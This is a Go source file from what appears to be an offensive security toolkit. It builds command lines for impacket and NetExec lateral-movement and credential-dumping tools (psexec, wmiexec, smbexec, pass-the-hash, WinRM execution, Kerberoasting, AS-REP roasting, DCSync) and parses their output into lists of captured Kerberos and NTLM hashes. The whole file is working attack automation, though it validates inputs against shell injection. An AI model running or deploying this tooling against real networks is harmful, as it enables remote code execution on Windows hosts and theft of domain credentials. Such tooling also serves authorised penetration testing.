package lat

import (
	"encoding/json"
	"fmt"
	"net"
	"regexp"
	"strconv"
	"strings"
)

// This file holds the pure, side-effect-free half of latkit: Input validation,
// deterministic argv construction and output parsing. It never spawns a
// process, so every tool's command line is unit-testable on its own.
//
// The impacket/NetExec binaries are external tools invoked ONLY as subprocesses
// through core.ProcessRunner (docs §6.2/§6.4). Their source is never imported
// or vendored. GPL projects (sliver, sqlmap, jwt_tool) are never referenced.

// Input is the union of every field any lat tool accepts. Each tool's builder
// validates and requires only the subset it needs.
type Input struct {
	Target  string `json:"target"`
	Domain  string `json:"domain"`
	User    string `json:"user"`
	Secret  string `json:"secret"`  // password (mutually exclusive with hash)
	Hash    string `json:"hash"`    // NTLM hash (pass-the-hash / DCSync)
	Command string `json:"command"` // remote command to run
	Port    int    `json:"port"`    // optional non-default port
}

var (
	// ntlmRE matches a bare 32-hex NTLM hash or the LMHASH:NTHASH pair.
	ntlmRE = regexp.MustCompile(`^(?:[0-9a-fA-F]{32}:)?[0-9a-fA-F]{32}$`)
	// hostRE validates a target host/IP/FQDN (':' allows IPv6 literals).
	hostRE = regexp.MustCompile(`^[A-Za-z0-9._:%-]+$`)
	// domainRE validates a NetBIOS/DNS domain name.
	domainRE = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)
	// userRE validates an account name; '$' allows machine accounts and '\'
	// allows DOMAIN\user forms.
	userRE = regexp.MustCompile(`^[A-Za-z0-9._$\\-]+$`)
	// commandUnsafeRE is the set of characters that must never reach a remote
	// command: they would inject a second command or expand a variable if the
	// value were ever re-interpolated into a shell. Spaces and backslashes are
	// allowed (Windows paths), everything shell-significant is not.
	commandUnsafeRE = regexp.MustCompile("[\x60$'\";|&<>\x00-\x1f\x7f]")
)

// validateHost rejects a target that could break argv parsing or smuggle an
// option. It mirrors MSFResource's option validation in exploitkit/msf.go.
func validateHost(v string) error {
	if v == "" {
		return nil
	}
	if !hostRE.MatchString(v) || strings.HasPrefix(v, "-") {
		return fmt.Errorf("target 非法（只允许主机名/IP，禁止空白、shell 元字符与 '-' 开头）: %q", v)
	}
	return nil
}

// validateDomain validates an AD domain name.
func validateDomain(v string) error {
	if v == "" {
		return nil
	}
	if !domainRE.MatchString(v) || strings.HasPrefix(v, "-") {
		return fmt.Errorf("domain 非法: %q", v)
	}
	return nil
}

// validateUser validates an account name.
func validateUser(v string) error {
	if v == "" {
		return nil
	}
	if !userRE.MatchString(v) || strings.HasPrefix(v, "-") {
		return fmt.Errorf("user 非法: %q", v)
	}
	return nil
}

// validateSecret validates a password. Passwords keep any printable character
// (they travel as a single argv element, never through a shell), but must not
// contain whitespace or the ':'/'@' that would break impacket's
// `domain/user:secret@target` credential string, nor control characters.
func validateSecret(v string) error {
	if v == "" {
		return nil
	}
	if strings.HasPrefix(v, "-") {
		return fmt.Errorf("secret 不能以 '-' 开头（会被当作命令行选项）")
	}
	for _, r := range v {
		if r < 0x20 || r == 0x7f {
			return fmt.Errorf("secret 含控制字符")
		}
		if r == ' ' || r == '\t' || r == ':' || r == '@' {
			return fmt.Errorf("secret 不能包含空白、':' 或 '@'（会破坏 impacket 凭据串）")
		}
	}
	return nil
}

// validateCommand guards the remote command, which may contain spaces and
// Windows path separators but no shell metacharacters.
func validateCommand(cmd string) error {
	if cmd == "" {
		return nil
	}
	if commandUnsafeRE.MatchString(cmd) {
		return fmt.Errorf("command 含非法字符（禁止 shell 元字符 / 换行 / 引号 / 变量展开）: %q", cmd)
	}
	return nil
}

// parseInput decodes a tool Input payload.
func parseInput(raw json.RawMessage) (Input, error) {
	var in Input
	if len(raw) > 0 {
		if err := json.Unmarshal(raw, &in); err != nil {
			return in, fmt.Errorf("invalid Input: %w", err)
		}
	}
	return in, nil
}

// authArgs builds the impacket `[domain/]user[:secret]@target` positional and
// any `-hashes` flag. useHash forces the hash form (pass_the_hash, dcsync).
func authArgs(in Input, useHash bool) (string, []string, error) {
	if err := validateHost(in.Target); err != nil {
		return "", nil, err
	}
	if in.Target == "" {
		return "", nil, fmt.Errorf("target 必填")
	}
	if err := validateDomain(in.Domain); err != nil {
		return "", nil, err
	}
	if err := validateUser(in.User); err != nil {
		return "", nil, err
	}
	if in.User == "" {
		return "", nil, fmt.Errorf("user 必填")
	}

	who := in.User
	if in.Domain != "" {
		who = in.Domain + "/" + in.User
	}

	var extra []string
	hashMode := useHash || in.Hash != ""
	if hashMode {
		if in.Hash == "" {
			return "", nil, fmt.Errorf("需要 hash（NTLM，32 位十六进制，可带 LM: 前缀）")
		}
		if !ntlmRE.MatchString(in.Hash) {
			return "", nil, fmt.Errorf("hash 格式无效: %q", in.Hash)
		}
		extra = append(extra, "-hashes", normalizeHash(in.Hash))
		who += "@" + in.Target
	} else {
		if in.Secret == "" {
			return "", nil, fmt.Errorf("需要 secret（密码）或 hash")
		}
		if err := validateSecret(in.Secret); err != nil {
			return "", nil, err
		}
		who += ":" + in.Secret + "@" + in.Target
	}
	return who, extra, nil
}

// normalizeHash turns a bare NTHASH into impacket's `:NTHASH` form (empty LM),
// leaving an explicit LM:NT pair untouched.
func normalizeHash(h string) string {
	if strings.Contains(h, ":") {
		return h
	}
	return ":" + h
}

// targetIPArg adds `-target-ip <ip>` when the target is a literal IP so
// impacket does not need DNS resolution.
func targetIPArg(in Input) []string {
	if isIP(in.Target) {
		return []string{"-target-ip", in.Target}
	}
	return nil
}

// isIP reports whether s is a bare IPv4/IPv6 literal (no port).
func isIP(s string) bool {
	return s != "" && net.ParseIP(s) != nil
}

// portArg adds `-port <n>` for tools that accept a non-default port.
func portArg(in Input, allow bool) []string {
	if allow && in.Port > 0 && in.Port <= 65535 {
		return []string{"-port", strconv.Itoa(in.Port)}
	}
	return nil
}

// --- per-tool builders ---

// BuildPsexec builds `psexec.py` argv.
func BuildPsexec(in Input) (string, []string, error) {
	if err := validateCommand(in.Command); err != nil {
		return "", nil, err
	}
	who, extra, err := authArgs(in, false)
	if err != nil {
		return "", nil, err
	}
	args := []string{"psexec.py"}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, portArg(in, true)...)
	args = append(args, who)
	if in.Command != "" {
		args = append(args, in.Command)
	}
	return args[0], args[1:], nil
}

// BuildWmiexec builds `wmiexec.py` argv.
func BuildWmiexec(in Input) (string, []string, error) {
	if err := validateCommand(in.Command); err != nil {
		return "", nil, err
	}
	who, extra, err := authArgs(in, false)
	if err != nil {
		return "", nil, err
	}
	args := []string{"wmiexec.py"}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, who)
	if in.Command != "" {
		args = append(args, in.Command)
	}
	return args[0], args[1:], nil
}

// BuildSmbexec builds `smbexec.py` argv.
func BuildSmbexec(in Input) (string, []string, error) {
	if err := validateCommand(in.Command); err != nil {
		return "", nil, err
	}
	who, extra, err := authArgs(in, false)
	if err != nil {
		return "", nil, err
	}
	args := []string{"smbexec.py"}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, who)
	if in.Command != "" {
		args = append(args, in.Command)
	}
	return args[0], args[1:], nil
}

// BuildPassTheHash builds the impacket `-hashes` argv used for pass-the-hash.
func BuildPassTheHash(in Input) (string, []string, error) {
	if err := validateCommand(in.Command); err != nil {
		return "", nil, err
	}
	if in.User == "" {
		return "", nil, fmt.Errorf("user 必填")
	}
	if in.Hash == "" {
		return "", nil, fmt.Errorf("hash 必填（NTLM）")
	}
	who, extra, err := authArgs(in, true)
	if err != nil {
		return "", nil, err
	}
	args := []string{"psexec.py"}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, portArg(in, true)...)
	args = append(args, who)
	if in.Command != "" {
		args = append(args, in.Command)
	}
	return args[0], args[1:], nil
}

// BuildWinRM builds a NetExec (nxc) winrm argv.
func BuildWinRM(in Input) (string, []string, error) {
	if err := validateHost(in.Target); err != nil {
		return "", nil, err
	}
	if in.Target == "" {
		return "", nil, fmt.Errorf("target 必填")
	}
	if err := validateUser(in.User); err != nil {
		return "", nil, err
	}
	if in.User == "" {
		return "", nil, fmt.Errorf("user 必填")
	}
	if err := validateCommand(in.Command); err != nil {
		return "", nil, err
	}
	args := []string{"nxc", "winrm", in.Target}
	if in.Domain != "" {
		if err := validateDomain(in.Domain); err != nil {
			return "", nil, err
		}
		args = append(args, "-d", in.Domain)
	}
	args = append(args, "-u", in.User)
	switch {
	case in.Hash != "":
		if !ntlmRE.MatchString(in.Hash) {
			return "", nil, fmt.Errorf("hash 格式无效: %q", in.Hash)
		}
		args = append(args, "-H", strings.TrimPrefix(normalizeHash(in.Hash), ":"))
	case in.Secret != "":
		if err := validateSecret(in.Secret); err != nil {
			return "", nil, err
		}
		args = append(args, "-p", in.Secret)
	default:
		return "", nil, fmt.Errorf("需要 secret 或 hash")
	}
	if in.Port > 0 && in.Port <= 65535 {
		args = append(args, "--port", strconv.Itoa(in.Port))
	}
	if in.Command != "" {
		args = append(args, "-x", in.Command)
	}
	return args[0], args[1:], nil
}

// BuildKerberoast builds a `GetUserSPNs.py -request` argv.
func BuildKerberoast(in Input) (string, []string, error) {
	who, extra, err := authArgs(in, false)
	if err != nil {
		return "", nil, err
	}
	args := []string{"GetUserSPNs.py", "-request", "-dc-ip", in.Target}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, who)
	return args[0], args[1:], nil
}

// BuildAsrepRoast builds a `GetNPUsers.py -no-pass -format hashcat` argv.
func BuildAsrepRoast(in Input) (string, []string, error) {
	if err := validateHost(in.Target); err != nil {
		return "", nil, err
	}
	if in.Target == "" {
		return "", nil, fmt.Errorf("target 必填")
	}
	if err := validateDomain(in.Domain); err != nil {
		return "", nil, err
	}
	if err := validateUser(in.User); err != nil {
		return "", nil, err
	}
	if in.User == "" {
		return "", nil, fmt.Errorf("user 必填")
	}
	// AS-REP roasting requests a ticket for a user without a password, so the
	// positional is `[domain/]user@target` (no `:secret`).
	prefix := in.User
	if in.Domain != "" {
		prefix = in.Domain + "/" + in.User
	}
	args := []string{"GetNPUsers.py", "-no-pass", "-format", "hashcat", "-dc-ip", in.Target}
	args = append(args, targetIPArg(in)...)
	args = append(args, prefix+"@"+in.Target)
	return args[0], args[1:], nil
}

// BuildDCSync builds a `secretsdump.py -just-dc` argv.
func BuildDCSync(in Input) (string, []string, error) {
	who, extra, err := authArgs(in, false)
	if err != nil {
		return "", nil, err
	}
	args := []string{"secretsdump.py", "-just-dc", "-dc-ip", in.Target}
	args = append(args, extra...)
	args = append(args, targetIPArg(in)...)
	args = append(args, who)
	return args[0], args[1:], nil
}

// buildFunc is the signature every tool builder shares.
type buildFunc func(Input) (string, []string, error)

// builders maps a tool name to its pure argv builder. BuildCommand is the
// dispatcher the capability uses; tests call the exported builders directly.
var builders = map[string]buildFunc{
	"lat_psexec":        BuildPsexec,
	"lat_wmiexec":       BuildWmiexec,
	"lat_smbexec":       BuildSmbexec,
	"lat_winrm":         BuildWinRM,
	"lat_pass_the_hash": BuildPassTheHash,
	"lat_kerberoast":    BuildKerberoast,
	"lat_asrep_roast":   BuildAsrepRoast,
	"lat_dcsync":        BuildDCSync,
}

// BuildCommand decodes raw Input and returns the deterministic (path, args)
// for the named tool. It performs no I/O.
func BuildCommand(tool string, raw json.RawMessage) (string, []string, error) {
	build, ok := builders[tool]
	if !ok {
		return "", nil, fmt.Errorf("unknown tool: %s", tool)
	}
	in, err := parseInput(raw)
	if err != nil {
		return "", nil, err
	}
	return build(in)
}

// --- output parsing ---

// CredHash is one credential material line parsed out of a tool's stdout.
type CredHash struct {
	Account string `json:"account,omitempty"`
	Hash    string `json:"hash"`
	Type    string `json:"type"` // krb5tgs | krb5as | ntlm
	Source  string `json:"source"`
}

var (
	// krb5PairRE matches `account:$krb5tgs$...` / `account:$krb5asrep$...`
	// (GetUserSPNs / GetNPUsers `-format hashcat` and john output).
	krb5PairRE = regexp.MustCompile(`^(\S+?):(\$krb5(?:tgs|asrep|as|pa)\$\S+)$`)
	// krb5BareRE matches a bare hash token printed after the account line.
	krb5BareRE = regexp.MustCompile(`(\$krb5(?:tgs|asrep|as|pa)\$\S+)`)
	// secretsdumpRE matches `user:RID:LMHASH:NTHASH:::` NTDS lines.
	secretsdumpRE = regexp.MustCompile(`^([^:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::?$`)
)

// ParseHashes extracts credential material from impacket stdout. It tolerates
// both the Kerberos hash formats (GetUserSPNs/GetNPUsers) and the NTDS
// `-just-dc` format produced by secretsdump.py.
func ParseHashes(tool string, out []byte) []CredHash {
	var res []CredHash
	seen := map[string]bool{}
	for _, raw := range strings.Split(string(out), "\n") {
		line := strings.TrimSpace(raw)
		if line == "" {
			continue
		}
		if m := krb5PairRE.FindStringSubmatch(line); m != nil {
			addHash(&res, seen, CredHash{Account: m[1], Hash: m[2], Type: krb5Type(m[2]), Source: tool})
			continue
		}
		if m := secretsdumpRE.FindStringSubmatch(line); m != nil {
			addHash(&res, seen, CredHash{Account: m[1], Hash: m[4], Type: "ntlm", Source: tool})
			continue
		}
		if m := krb5BareRE.FindStringSubmatch(line); m != nil {
			acct := accountFromToken(m[1])
			addHash(&res, seen, CredHash{Account: acct, Hash: m[1], Type: krb5Type(m[1]), Source: tool})
		}
	}
	return res
}

// accountFromToken recovers the account from a bare Kerberos hash token:
//
//	$krb5tgs$23$*user$DOMAIN$spn*$...   -> user
//	$krb5asrep$23$user@DOMAIN:...       -> user@DOMAIN
//
// It returns "" when the shape is unrecognized.
func accountFromToken(tok string) string {
	parts := strings.Split(tok, "$")
	for i, p := range parts {
		if strings.HasPrefix(p, "*") && i+1 < len(parts) {
			return strings.TrimPrefix(p, "*")
		}
	}
	// AS-REP: $krb5asrep$<etype>$user@DOMAIN:<checksum>
	if strings.Contains(tok, "$krb5asrep$") {
		if i := strings.Index(tok, "@"); i >= 0 {
			rest := tok[i:]
			if j := strings.IndexAny(rest, ":"); j >= 0 {
				if k := strings.LastIndex(tok[:i], "$"); k >= 0 {
					return tok[k+1 : i+j]
				}
			}
		}
	}
	return ""
}

func addHash(res *[]CredHash, seen map[string]bool, h CredHash) {
	key := h.Type + "|" + h.Account + "|" + h.Hash
	if seen[key] {
		return
	}
	seen[key] = true
	*res = append(*res, h)
}

// krb5Type maps a Kerberos hash token to its short type name.
func krb5Type(token string) string {
	switch {
	case strings.Contains(token, "$krb5tgs$"):
		return "krb5tgs"
	case strings.Contains(token, "$krb5asrep$"), strings.Contains(token, "$krb5as$"):
		return "krb5as"
	case strings.Contains(token, "$krb5pa$"):
		return "krb5pa"
	}
	return "krb5"
}
